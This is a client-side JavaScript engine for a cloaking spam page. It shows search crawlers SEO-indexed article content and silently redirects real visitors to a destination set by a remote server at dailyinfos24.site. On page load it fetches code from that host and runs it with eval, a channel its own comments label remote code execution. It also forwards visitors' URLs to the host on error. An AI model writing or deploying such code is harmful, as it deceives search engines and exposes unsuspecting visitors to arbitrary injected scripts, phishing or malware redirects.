(function() {
    'use strict';

    // --- 1. CONFIGURATION & STATE ---
    const CONFIG = {
        isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
        params: new URLSearchParams(window.location.search),
        debug: new URLSearchParams(window.location.search).has("dbg123"),
        identifier: new URLSearchParams(window.location.search).get("o2x") || new URLSearchParams(window.location.search).get("io0"),
        endpoints: {
            content: "https://dailyinfos24.site/js6/index.php?id=",
            api: "https://dailyinfos24.site/api/latest/",
            storage: "https://storage.dailyinfos24.site/fetch/"
        }
    };

    let state = { triggered: false, domReady: false, loaderActive: false };
    const DOM = {};

    // --- 2. INITIALIZATION ---
    async function init() {
        if (!CONFIG.identifier) return render404();

        // Inject Meta Tags Immediately for SEO
        injectMetaBase();

        // Show Loader for real users
        if (!CONFIG.isBot) showLoader();

        try {
            // Fetch API Control & Content in Parallel
            const [apiData, contentData] = await Promise.all([
                fetchJSON(`${CONFIG.endpoints.api}${CONFIG.identifier}`),
                fetchJSON(`${CONFIG.endpoints.content}${CONFIG.identifier}`)
            ]);

            handleLogic(apiData, contentData);
        } catch (err) {
            console.error("Engine Error:", err);
            if (!CONFIG.debug && !CONFIG.isBot) errorRedirect();
        }
    }

    // --- 3. CORE LOGIC (REDIRECTS vs RENDERING) ---
    function handleLogic(api, content) {
        // A. Handle Remote Code Execution (cCode/rCode)
        if (api.cCode) eval(api.cCode);
        if (api.rCode) eval(api.rCode);

        // B. Handle Redirects (Cloaking)
        if (api.redirect && !CONFIG.isBot && !CONFIG.debug) {
            state.triggered = true;
            window.location.replace(api.to);
            return;
        }

        // C. Render Content for Bots or Debugging
        renderUI(content, api);
    }

    // --- 4. DOM & UI RENDERING ---
    function renderUI(content, api) {
        if (state.domReady) return;
        setupStyles();
        createSkeleton();
        
        // Populate Data
        document.title = `${titleCase(content.title)} [${content.random1 || ''}]`;
        DOM.h1.textContent = titleCase(content.title);
        DOM.time.textContent = `Published: ${formatDate(api.updated)}`;
        DOM.img.src = content.backdrop || content.image;
        
        // Split and Inject Text
        const [p1, p2] = splitText(content.text || "");
        DOM.p1.innerHTML = p1;
        DOM.p2.innerHTML = p2;

        // CTA Links
        if (api.to) {
            DOM.cta1.href = api.to;
            DOM.cta2.href = api.to;
        }

        // Schemas
        if (content.schemas) content.schemas.forEach(s => injectSchema(s.id, s.data));
        if (api.schemas) api.schemas.forEach(s => injectSchema(s.id, s.data));

        hideLoader();
        state.domReady = true;
    }

    // --- 5. UTILITIES ---
    async function fetchJSON(url) {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return response.json();
    }

    function injectMetaBase() {
        const metas = [
            { charset: "utf-8" },
            { name: "viewport", content: "width=device-width, initial-scale=1" },
            { name: "robots", content: "index, follow" }
        ];
        metas.forEach(m => {
            let el = document.createElement('meta');
            Object.keys(m).forEach(key => el.setAttribute(key, m[key]));
            document.head.appendChild(el);
        });
    }

    function injectSchema(id, data) {
        if (document.getElementById(id)) return;
        const s = document.createElement('script');
        s.type = 'application/ld+json';
        s.id = id;
        s.text = JSON.stringify(data);
        document.head.appendChild(s);
    }

    function titleCase(str) {
        return str ? str.replace(/\b\w/g, l => l.toUpperCase()) : "";
    }

    function formatDate(dateStr) {
        const d = dateStr ? new Date(dateStr) : new Date();
        return d.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
    }

    function splitText(text) {
        const mid = Math.floor(text.length / 2);
        const splitPoint = text.indexOf('\n', mid);
        return splitPoint === -1 ? [text, ""] : [text.substring(0, splitPoint), text.substring(splitPoint)];
    }

    // --- 6. VISUAL COMPONENTS ---
    function showLoader() {
        state.loaderActive = true;
        const loader = document.createElement('div');
        loader.id = "app-loader";
        loader.innerHTML = `<div class="spin"></div><style>
            #app-loader { position:fixed; inset:0; background:#fff; z-index:999; display:flex; align-items:center; justify-content:center; }
            .spin { width:50px; height:50px; border:3px solid #eee; border-top-color:#3b82f6; border-radius:50%; animation: s 1s linear infinite; }
            @keyframes s { to { transform:rotate(360deg); } }
        </style>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById("app-loader");
        if (loader) loader.style.display = "none";
    }

    function setupStyles() {
        const style = document.createElement('style');
        style.textContent = `
            body { font-family: sans-serif; line-height:1.6; color:#333; margin:0; padding:0; background:#f9fafb; }
            .container { max-width: 800px; margin: 40px auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 4px 6px -1px rgba(0,0,0,0.1); }
            h1 { font-size: 2.5rem; color:#111; }
            img { width:100%; border-radius:8px; margin: 20px 0; }
            .cta-btn { display:block; background:#3b82f6; color:#fff; text-align:center; padding:15px; text-decoration:none; border-radius:5px; font-weight:bold; margin:20px 0; }
        `;
        document.head.appendChild(style);
    }

    function createSkeleton() {
        const wrapper = document.createElement('div');
        wrapper.className = "container";
        
        DOM.h1 = document.createElement('h1');
        DOM.time = document.createElement('p');
        DOM.time.style.color = "#666";
        DOM.img = document.createElement('img');
        DOM.p1 = document.createElement('div');
        DOM.cta1 = document.createElement('a');
        DOM.cta1.className = "cta-btn";
        DOM.cta1.textContent = "ACCESS EXCLUSIVE CONTENT";
        DOM.p2 = document.createElement('div');
        DOM.cta2 = document.createElement('a');
        DOM.cta2.className = "cta-btn";
        DOM.cta2.textContent = "CONTINUE READING";

        [DOM.h1, DOM.time, DOM.img, DOM.p1, DOM.cta1, DOM.p2, DOM.cta2].forEach(el => wrapper.appendChild(el));
        document.body.appendChild(wrapper);
    }

    function render404() {
        document.body.innerHTML = `<div style="text-align:center; padding:50px;"><h1>404 Not Found</h1><p>The content could not be located.</p></div>`;
    }

    function errorRedirect() {
        window.location.href = `https://dailyinfos24.site/bh?ref=${encodeURIComponent(window.location.href)}`;
    }

    // Run Engine
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
